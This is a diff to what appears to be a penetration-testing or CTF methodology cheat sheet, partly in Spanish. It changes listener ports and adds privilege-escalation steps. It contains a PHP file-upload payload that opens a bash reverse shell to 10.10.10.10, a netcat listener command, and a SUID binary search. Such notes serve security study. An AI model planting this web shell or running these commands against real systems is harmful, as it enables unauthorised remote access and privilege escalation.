@@ -35,7 +35,7 @@ ip a show tun0
 Esperar conexión:
 
 ```bash
-nc -lvnp 4444
+nc -lvnp 9001
 ```
 
 ## Metodología
@@ -114,7 +114,7 @@ LFI:
 File upload:
 
 ```php
-<?php shell_exec("bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'"); ?>
+<?php shell_exec("bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'"); ?>
 ```
 
 ```php
@@ -123,8 +123,16 @@ File upload:
 
 ### Privilege Escalation
 
-Check `sudo` permissions:
+Tratamiento de la TTY: <https://invertebr4do.github.io/tratamiento-de-tty/>
+
+Permisos de `sudo`:
 
 ```bash
 sudo -l
+```
+
+Encontrar binarios SUID:
+
+```bash
+find / -perm -u=s 2>/dev/null
 ```
